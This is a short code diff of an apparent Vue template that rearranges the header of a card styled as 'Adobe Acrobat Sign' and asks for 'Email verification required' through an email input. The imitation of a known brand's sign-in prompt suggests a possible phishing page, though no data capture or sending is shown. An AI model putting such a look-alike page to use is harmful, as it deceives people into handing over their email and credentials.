@@ -4,16 +4,10 @@
       <div class="sign-card">
         <div class="header">
           <div class="logo-text">
-            <span class="person-icon">⼈</span>
-            Adobe Acrobat Sign
           </div>
-      
-
-        <div class="success-check">✓</div>
-
+        <div class="success-check">⼈</div> Adobe Acrobat Sign
         <div class="content">
-          <p><strong>Email verification required.</strong></p>
-         
+          <p><strong>Email verification required.</strong></p> 
           <input
             v-model="email"
             type="email"
